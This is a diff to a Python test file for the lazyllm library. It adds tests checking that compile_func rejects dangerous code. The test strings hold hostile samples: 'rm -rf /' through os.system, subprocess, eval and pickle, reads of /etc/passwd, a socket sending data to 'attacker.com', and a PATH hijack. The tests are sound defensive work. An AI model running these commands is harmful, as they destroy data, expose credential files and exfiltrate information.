@@ -90,8 +90,12 @@ class TestCommon(object):
 
         r1 = lazyllm.make_repr('a', 1)
         r2 = lazyllm.make_repr('b', 2)
-        rr = lazyllm.make_repr('c', 3, subs=[r1, r2])
-        assert rr == '<c type=3>\n |- <a type=1>\n └- <b type=2>\n'
+        assert lazyllm.make_repr('c', 3, subs=[r1, r2]) == '<c type=3>'
+
+        with lazyllm.config.temp('repr_show_child', True):
+            assert lazyllm.make_repr('c', 3, subs=[r1, r2]) == '<c type=3>\n |- <a type=1>\n └- <b type=2>\n'
+
+        assert lazyllm.make_repr('c', 3, subs=[r1, r2]) == '<c type=3>'
 
     def test_compile_func(self):
         str1 = "def identity(v): return v"
@@ -103,6 +107,67 @@ class TestCommon(object):
         square = compile_func(str2)
         assert square(3) == 9
         assert square(18) == 324
+
+    def test_compile_func_dangerous_code(self):
+        func1 = """def use_exec():\n    exec('print("This is unsafe")')"""
+        with pytest.raises(ValueError, match="⚠️ Detected dangerous function call: exec"):
+            compile_func(func1)
+
+        func2 = """def del_file():\n    eval("__import__('os').system('rm -rf /')")"""
+        with pytest.raises(ValueError, match="⚠️ Detected dangerous function call: eval"):
+            compile_func(func2)
+
+        func3 = """def read_file():\n    open("/etc/passwd", "r").read()"""
+        with pytest.raises(ValueError, match="⚠️ Detected dangerous function call: open"):
+            compile_func(func3)
+
+        func4 = ("""def comiple_function():\n    code = compile("os.system('rm -rf /')", """
+                 """"<string>", "exec")\n    exec(code)""")
+        with pytest.raises(ValueError, match="⚠️ Detected dangerous function call: compile"):
+            compile_func(func4)
+
+        func5 = """def get_attr():\n    getattr(__builtins__, "eval")("os.system('rm -rf /')")"""
+        with pytest.raises(ValueError, match="⚠️ Detected dangerous function call: getattr"):
+            compile_func(func5)
+
+    def test_compile_func_dangerous_os_operation(self):
+        func1 = """import os\ndef use_system():\n    os.system("rm -rf /")"""
+        with pytest.raises(ValueError, match="⚠️ Detected dangerous os call: os.system"):
+            compile_func(func1)
+
+        func2 = """import os\ndef use_popen():\n    os.popen("cat /etc/passwd").read()"""
+        with pytest.raises(ValueError, match="⚠️ Detected dangerous os call: os.popen"):
+            compile_func(func2)
+
+    def test_compile_func_dangerous_sys_operation(self):
+        func1 = """import sys\ndef use_exit():\n    sys.exit(1)\n"""
+        with pytest.raises(ValueError, match="⚠️ Detected dangerous sys call: sys.exit"):
+            compile_func(func1)
+
+    def test_compile_func_dangerous_import(self):
+        func1 = ("""import pickle\ndef load_cmd():\n    """
+                 """malicious_data = pickle.dumps({"command": lambda: __import__("os").system("rm -rf /")})\n"""
+                 """    pickle.loads(malicious_data)""")
+        with pytest.raises(ValueError, match="⚠️ Detected dangerous module import: pickle"):
+            compile_func(func1)
+
+        func2 = """import subprocess\ndef del_all():\n    subprocess.run("rm -rf /", shell=True)"""
+        with pytest.raises(ValueError, match="⚠️ Detected dangerous module import: subprocess"):
+            compile_func(func2)
+
+        func3 = ("""import socket\ndef send_data():\n    s = socket.socket()\n    s.connect(("attacker.com", 80))\n"""
+                 """    s.send(b"Sensitive data")""")
+        with pytest.raises(ValueError, match="⚠️ Detected dangerous module import: socket"):
+            compile_func(func3)
+
+        func4 = """from shutil import rmtree\ndef del_file():\n    rmtree("important_file.txt")"""
+        with pytest.raises(ValueError, match="⚠️ Detected dangerous module import: shutil"):
+            compile_func(func4)
+
+    def test_compile_func_dangerous_attr(self):
+        func1 = """import os\ndef set_path():\n    os.environ['PATH'] = '/malicious/path'"""
+        with pytest.raises(ValueError, match="⚠️ Detected dangerous access: os.environ"):
+            compile_func(func1)
 
 
 class TestCommonOnce(object):
